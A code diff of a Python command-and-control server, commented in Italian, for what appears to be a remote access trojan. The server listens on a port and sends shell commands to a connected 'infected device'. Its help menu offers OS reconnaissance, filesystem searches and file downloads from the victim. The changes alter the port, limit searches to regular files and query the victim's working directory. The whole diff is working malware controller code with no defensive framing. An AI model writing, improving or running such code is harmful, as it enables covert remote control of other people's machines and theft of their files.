@@ -61,7 +61,7 @@ def getFile(connectionSocket: socket, fileName):
 
 def StartConnection():  # funzione di connessione (da controllare)
     print('opening the server \n')
-    serverPort = 12014
+    serverPort = 12018
     serverSocket = socket(AF_INET, SOCK_STREAM)
     serverSocket.bind(('', serverPort))
     serverSocket.listen(1)
@@ -89,15 +89,14 @@ def LogOnFile(nomeFile: str, strPerFile: str):
 
 def searchFile(connectionSocket, fileName):
     global windowsFlag
-    print(windowsFlag)
     if windowsFlag == "w":
         cmd = "dir \"" + fileName + "\" /a /s"
         print(cmd)
     else:
         if fileName != "":
-            cmd = "find -name " + fileName
+            cmd = "find -type f -name " + fileName
         else:
-            cmd = "find"
+            cmd = "find -type f"
     connectionSocket.send(cmd.encode())  # 143
     print("Ricerca...")
     global stop_threads
@@ -165,6 +164,8 @@ def main():
         try:
             connectionSocket = StartConnection()  # apriamo connessione e inizializziamo
             AssegnaWinFlag(connectionSocket)
+            connectionSocket.send("cd .".encode())
+            pwd = connectionSocket.recv(1024).decode()
             help = "infoOs                          ricevi informazioni del sistema operativo\nsearch [nome file]              cerca un file nel " \
                    "filesystem \nget [nome file]                 scarica il file dal dispositivo infetto\nesc                             chiudi la " \
                    "sessione \nhelp                            guida comandi\ncd                              change directory\ndir/ls                          listing " \
